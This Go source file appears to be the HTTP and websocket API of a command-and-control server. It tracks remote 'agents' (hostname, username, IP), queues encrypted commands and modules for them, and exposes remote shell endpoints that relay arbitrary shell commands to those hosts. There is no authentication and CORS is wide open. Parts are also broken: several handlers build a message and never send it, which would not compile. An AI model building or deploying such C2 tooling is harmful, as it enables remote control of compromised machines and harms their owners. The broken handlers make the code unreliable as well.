package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type APIServer struct {
	server *Server
	router *gin.Engine
}

func NewAPIServer(s *Server) *APIServer {
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	
	r.Use(CORSMiddleware())
	r.Use(RequestLogger())
	
	api := &APIServer{server: s, router: r}
	api.setupRoutes()
	return api
}

func CORSMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, accept, origin, Cache-Control, X-Requested-With")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET, PUT, DELETE")
		
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	}
}

func RequestLogger() gin.HandlerFunc {
	return func(c *gin.Context) {
		start := time.Now()
		path := c.Request.URL.Path
		raw := c.Request.URL.RawQuery
		
		c.Next()
		
		latency := time.Since(start)
		if raw != "" {
			path = path + "?" + raw
		}
		fmt.Printf("[%s] %s %s %d %v\n",
			time.Now().Format("2006-01-02 15:04:05"),
			c.Request.Method, path, c.Writer.Status(), latency)
	}
}

func (a *APIServer) setupRoutes() {
	v1 := a.router.Group("/api/v1")
	{
		v1.GET("/health", a.healthCheck)
		v1.GET("/agents", a.listAgents)
		v1.GET("/agents/:id", a.getAgent)
		v1.DELETE("/agents/:id", a.removeAgent)
		
		v1.POST("/commands", a.sendCommand)
		v1.GET("/commands", a.listCommands)
		v1.GET("/commands/:id", a.getCommand)
		v1.DELETE("/commands/:id", a.cancelCommand)
		
		v1.POST("/modules/execute", a.executeModule)
		v1.GET("/modules", a.listModules)
		v1.GET("/modules/:name", a.getModuleInfo)
		
		v1.POST("/agents/:id/interact", a.interactAgent)
		v1.GET("/agents/:id/shell", a.getShell)
		v1.POST("/agents/:id/shell", a.sendShellCommand)
		
		v1.GET("/stats", a.getStats)
		v1.GET("/stats/agents", a.getAgentStats)
		v1.GET("/stats/commands", a.getCommandStats)
	}
	
	a.router.GET("/ws/agents/:id", a.websocketAgent)
	a.router.GET("/ws/events", a.websocketEvents)
}

func (a *APIServer) healthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":    "ok",
		"timestamp": time.Now().Unix(),
		"version":   "1.0.0",
	})
}

func (a *APIServer) listAgents(c *gin.Context) {
	a.server.agentsMu.RLock()
	defer a.server.agentsMu.RUnlock()
	
	status := c.Query("status")
	agents := make([]map[string]interface{}, 0, len(a.server.agents))
	
	for _, agent := range a.server.agents {
		if status != "" && agent.Status != status {
			continue
		}
		agents = append(agents, map[string]interface{}{
			"id":           agent.ID,
			"hostname":     agent.Hostname,
			"os":           agent.OS,
			"arch":         agent.Arch,
			"username":     agent.Username,
			"ip":           agent.IP,
			"first_seen":   agent.FirstSeen.Unix(),
			"last_seen":    agent.LastSeen.Unix(),
			"status":       agent.Status,
			"modules":      agent.Modules,
			"uptime":       time.Since(agent.FirstSeen).Seconds(),
		})
	}
	
	c.JSON(http.StatusOK, gin.H{
		"agents": agents,
		"total":  len(agents),
	})
}

func (a *APIServer) getAgent(c *gin.Context) {
	id := c.Param("id")
	a.server.agentsMu.RLock()
	agent, exists := a.server.agents[id]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	c.JSON(http.StatusOK, map[string]interface{}{
		"id":           agent.ID,
		"hostname":     agent.Hostname,
		"os":           agent.OS,
		"arch":         agent.Arch,
		"username":     agent.Username,
		"ip":           agent.IP,
		"first_seen":   agent.FirstSeen.Unix(),
		"last_seen":    agent.LastSeen.Unix(),
		"status":       agent.Status,
		"modules":      agent.Modules,
		"uptime":       time.Since(agent.FirstSeen).Seconds(),
	})
}

func (a *APIServer) removeAgent(c *gin.Context) {
	id := c.Param("id")
	a.server.removeAgent(id)
	c.JSON(http.StatusOK, gin.H{"status": "removed"})
}

func (a *APIServer) sendCommand(c *gin.Context) {
	var req struct {
		AgentID string          `json:"agent_id" binding:"required"`
		Type    string          `json:"type" binding:"required"`
		Payload json.RawMessage `json:"payload"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	a.server.agentsMu.RLock()
	agent, exists := a.server.agents[req.AgentID]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	cmd := &Command{
		ID:        uuid.New().String(),
		AgentID:   req.AgentID,
		Type:      req.Type,
		Payload:   req.Payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	a.server.commandsMu.Lock()
	a.server.commands[cmd.ID] = cmd
	a.server.commandsMu.Unlock()
	
	encrypted, _ := encrypt(cmd.Payload, agent.EncryptionKey)
	msg := map[string]string{
		"type":       "command",
		"command_id": cmd.ID,
		"cmd_type":   cmd.Type,
		"payload":    encrypted,
	}
	
	c.JSON(http.StatusOK, gin.H{"command_id": cmd.ID, "status": "queued"})
}

func (a *APIServer) listCommands(c *gin.Context) {
	a.server.commandsMu.RLock()
	defer a.server.commandsMu.RUnlock()
	
	status := c.Query("status")
	agentID := c.Query("agent_id")
	
	commands := make([]*Command, 0, len(a.server.commands))
	for _, cmd := range a.server.commands {
		if status != "" && cmd.Status != status { continue }
		if agentID != "" && cmd.AgentID != agentID { continue }
		commands = append(commands, cmd)
	}
	
	c.JSON(http.StatusOK, gin.H{"commands": commands, "total": len(commands)})
}

func (a *APIServer) getCommand(c *gin.Context) {
	id := c.Param("id")
	a.server.commandsMu.RLock()
	cmd, exists := a.server.commands[id]
	a.server.commandsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "command not found"})
		return
	}
	c.JSON(http.StatusOK, cmd)
}

func (a *APIServer) cancelCommand(c *gin.Context) {
	id := c.Param("id")
	a.server.commandsMu.Lock()
	cmd, exists := a.server.commands[id]
	if exists {
		cmd.Status = "cancelled"
	}
	a.server.commandsMu.Unlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "command not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": "cancelled"})
}

func (a *APIServer) executeModule(c *gin.Context) {
	var req struct {
		AgentID string          `json:"agent_id" binding:"required"`
		Module  string          `json:"module" binding:"required"`
		Args    json.RawMessage `json:"args"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	a.server.agentsMu.RLock()
	agent, exists := a.server.agents[req.AgentID]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	cmd := &Command{
		ID:        uuid.New().String(),
		AgentID:   req.AgentID,
		Type:      "module",
		Payload:   req.Args,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	a.server.commandsMu.Lock()
	a.server.commands[cmd.ID] = cmd
	a.server.commandsMu.Unlock()
	
	encrypted, _ := encrypt(cmd.Payload, agent.EncryptionKey)
	msg := map[string]string{
		"type":       "command",
		"command_id": cmd.ID,
		"cmd_type":   "module",
		"module":     req.Module,
		"payload":    encrypted,
	}
	
	c.JSON(http.StatusOK, gin.H{"command_id": cmd.ID, "status": "queued", "module": req.Module})
}

func (a *APIServer) listModules(c *gin.Context) {
	modules := GetAvailableModules()
	result := make([]map[string]string, 0, len(modules))
	for name, mod := range modules {
		result = append(result, map[string]string{
			"name":        name,
			"description": mod.Description(),
		})
	}
	c.JSON(http.StatusOK, gin.H{"modules": result})
}

func (a *APIServer) getModuleInfo(c *gin.Context) {
	name := c.Param("name")
	modules := GetAvailableModules()
	mod, exists := modules[name]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "module not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"name":        mod.Name(),
		"description": mod.Description(),
	})
}

func (a *APIServer) interactAgent(c *gin.Context) {
	id := c.Param("id")
	a.server.agentsMu.RLock()
	agent, exists := a.server.agents[id]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{
		"agent_id":  agent.ID,
		"shell_ready": true,
		"modules":   agent.Modules,
	})
}

func (a *APIServer) getShell(c *gin.Context) {
	id := c.Param("id")
	a.server.agentsMu.RLock()
	_, exists := a.server.agents[id]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{
		"agent_id": id,
		"shell":    "interactive",
		"prompt":   "$ ",
	})
}

func (a *APIServer) sendShellCommand(c *gin.Context) {
	id := c.Param("id")
	var req struct {
		Command string `json:"command" binding:"required"`
		Timeout int    `json:"timeout"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	a.server.agentsMu.RLock()
	agent, exists := a.server.agents[id]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	payload, _ := json.Marshal(map[string]string{"command": req.Command})
	cmd := &Command{
		ID:        uuid.New().String(),
		AgentID:   id,
		Type:      "shell",
		Payload:   payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	a.server.commandsMu.Lock()
	a.server.commands[cmd.ID] = cmd
	a.server.commandsMu.Unlock()
	
	encrypted, _ := encrypt(cmd.Payload, agent.EncryptionKey)
	msg := map[string]string{
		"type":       "command",
		"command_id": cmd.ID,
		"cmd_type":   "shell",
		"payload":    encrypted,
	}
	
	c.JSON(http.StatusOK, gin.H{"command_id": cmd.ID, "status": "queued"})
}

func (a *APIServer) getStats(c *gin.Context) {
	a.server.agentsMu.RLock()
	a.server.commandsMu.RLock()
	
	activeAgents := 0
	for _, a := range a.server.agents {
		if a.Status == "active" { activeAgents++ }
	}
	
	pendingCommands := 0
	completedCommands := 0
	failedCommands := 0
	for _, cmd := range a.server.commands {
		switch cmd.Status {
		case "pending": pendingCommands++
		case "completed": completedCommands++
		case "failed": failedCommands++
		}
	}
	
	a.server.commandsMu.RUnlock()
	a.server.agentsMu.RUnlock()
	
	c.JSON(http.StatusOK, gin.H{
		"total_agents":       len(a.server.agents),
		"active_agents":      activeAgents,
		"total_commands":     len(a.server.commands),
		"pending_commands":   pendingCommands,
		"completed_commands": completedCommands,
		"failed_commands":    failedCommands,
	})
}

func (a *APIServer) getAgentStats(c *gin.Context) {
	a.server.agentsMu.RLock()
	defer a.server.agentsMu.RUnlock()
	
	osStats := make(map[string]int)
	archStats := make(map[string]int)
	statusStats := make(map[string]int)
	
	for _, agent := range a.server.agents {
		osStats[agent.OS]++
		archStats[agent.Arch]++
		statusStats[agent.Status]++
	}
	
	c.JSON(http.StatusOK, gin.H{
		"by_os":     osStats,
		"by_arch":   archStats,
		"by_status": statusStats,
	})
}

func (a *APIServer) getCommandStats(c *gin.Context) {
	a.server.commandsMu.RLock()
	defer a.server.commandsMu.RUnlock()
	
	typeStats := make(map[string]int)
	statusStats := make(map[string]int)
	
	for _, cmd := range a.server.commands {
		typeStats[cmd.Type]++
		statusStats[cmd.Status]++
	}
	
	c.JSON(http.StatusOK, gin.H{
		"by_type":   typeStats,
		"by_status": statusStats,
	})
}

func (a *APIServer) websocketAgent(c *gin.Context) {
	id := c.Param("id")
	a.server.agentsMu.RLock()
	_, exists := a.server.agents[id]
	a.server.agentsMu.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	
	ws, err := a.server.upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil { return }
	defer ws.Close()
	
	for {
		_, msg, err := ws.ReadMessage()
		if err != nil { break }
		
		var req map[string]interface{}
		json.Unmarshal(msg, &req)
		
		action, _ := req["action"].(string)
		switch action {
		case "shell":
			command, _ := req["command"].(string)
			cmd := &Command{
				ID:        uuid.New().String(),
				AgentID:   id,
				Type:      "shell",
				Payload:   json.RawMessage(fmt.Sprintf(`{"command":"%s"}`, strings.ReplaceAll(command, `"`, `\"`))),
				Status:    "pending",
				CreatedAt: time.Now(),
			}
			a.server.commandsMu.Lock()
			a.server.commands[cmd.ID] = cmd
			a.server.commandsMu.Unlock()
			
			a.server.agentsMu.RLock()
			agent := a.server.agents[id]
			a.server.agentsMu.RUnlock()
			
			encrypted, _ := encrypt(cmd.Payload, agent.EncryptionKey)
			ws.WriteJSON(map[string]string{
				"type":       "command",
				"command_id": cmd.ID,
				"cmd_type":   "shell",
				"payload":    encrypted,
			})
		case "heartbeat":
			ws.WriteJSON(map[string]interface{}{
				"type":      "heartbeat_ack",
				"timestamp": time.Now().Unix(),
			})
		}
	}
}

func (a *APIServer) websocketEvents(c *gin.Context) {
	ws, err := a.server.upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil { return }
	defer ws.Close()
	
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			a.server.agentsMu.RLock()
			agentCount := len(a.server.agents)
			a.server.agentsMu.RUnlock()
			
			ws.WriteJSON(map[string]interface{}{
				"type":         "stats_update",
				"agent_count":  agentCount,
				"timestamp":    time.Now().Unix(),
			})
		}
	}
}

func (a *APIServer) Run(addr string, certFile, keyFile string) error {
	if certFile != "" && keyFile != "" {
		return a.router.RunTLS(addr, certFile, keyFile)
	}
	return a.router.Run(addr)
}